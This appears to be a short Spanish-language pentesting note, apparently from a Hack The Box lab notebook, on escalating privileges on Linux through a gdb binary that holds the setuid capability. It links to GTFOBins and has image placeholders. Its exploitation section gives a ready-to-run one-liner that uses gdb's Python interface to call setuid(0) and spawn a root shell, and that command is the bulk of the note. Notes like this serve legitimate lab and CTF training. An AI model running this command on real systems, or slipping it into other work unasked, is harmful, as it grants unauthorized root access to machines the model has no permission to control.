
## DESCRIPTION

Escalada de privilegios usando la siguietne capabilitie:

![[Pasted image 20230518100510.png]]

#### Mas información
* https://gtfobins.github.io/gtfobins/gdb/


## EXPLOITATION

```
/usr/bin/gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit
```

![[Pasted image 20230518100610.png]]

## MACHINES

* Hack The Box: 
